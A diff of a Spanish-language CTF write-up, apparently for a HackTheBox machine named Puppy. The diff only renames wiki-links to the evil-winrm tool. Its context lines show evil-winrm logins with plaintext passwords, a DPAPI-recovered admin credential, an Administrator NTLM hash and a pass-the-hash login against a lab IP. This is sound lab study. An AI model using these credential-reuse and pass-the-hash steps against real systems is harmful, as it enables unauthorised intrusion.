@@ -229,7 +229,7 @@ Lo descomprimimos en nuestra maquina y vemos que hay un archivo config, lo vemos
 
 En bloodhaund vemos que no tiene ninguna regla de outbound así que poca cosa podemos hacer
 #### Segunda shell
-Como es miembro de remote manager nos podemos intentar conectar con [[EVIL_WINRM]]
+Como es miembro de remote manager nos podemos intentar conectar con [[EVIL-WINRM]]
 `evil-winrm -i 10.10.11.70 -u "steph.cooper" -p 'ChefSteph2025!'`
 Y nos da una terminal como este usuario:
 
@@ -272,7 +272,7 @@ Usaremos [[impacket-dpapi]] podemos derivar la clave para descifrar la masterkey
 [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025!
  ```
 
-Como es miembro de Administrador y de Remote manager accedemos con [[EVIL_WINRM]]
+Como es miembro de Administrador y de Remote manager accedemos con [[EVIL-WINRM]]
 `evil-winrm -i 10.10.11.70 -u "steph.cooper_adm" -p 'FivethChipOnItsWay2025!'`
 
 Para poder acceder como usuario Administrator usaremos [[00.- Herramientas/CRACKMAPEXEC]] para obtener el hash del usuario:
@@ -280,7 +280,7 @@ Para poder acceder como usuario Administrator usaremos [[00.- Herramientas/CRACK
 
 El hash es: `bb0edc15e49ceb4120c7bd7e6e65d75b`
 
-Y con el hash nos podremos conectar como Administrator con [[EVIL_WINRM]] 
+Y con el hash nos podremos conectar como Administrator con [[EVIL-WINRM]] 
 `evil-winrm -i 10.10.11.70 -u "Admiinistrator" -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'`
 
 Y nos encontramos la flag en el directorio Desktop
